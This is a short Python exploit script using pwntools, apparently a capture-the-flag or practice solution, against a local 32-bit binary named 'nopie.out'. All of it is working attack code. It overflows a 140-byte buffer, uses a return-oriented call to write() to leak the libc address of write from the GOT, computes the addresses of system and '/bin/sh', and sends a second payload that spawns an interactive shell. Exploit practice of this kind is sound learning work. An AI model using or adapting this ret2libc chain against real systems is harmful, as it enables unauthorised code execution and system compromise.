from pwn import *

io = process('./nopie.out')
elf = ELF('./nopie.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

vuln_func = 0x0804843b

payload1 = "A" * 140 + p32(elf.sym['write']) + p32(vuln_func) + p32(1) + p32(elf.got['write']) + p32(4)

io.send(payload1)

write_addr = u32(io.recv(4))
system_addr = write_addr - libc.sym['write'] + libc.sym['system']
binsh_addr = write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))

payload2 = "B" * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)

io.send(payload2)
io.interactive()
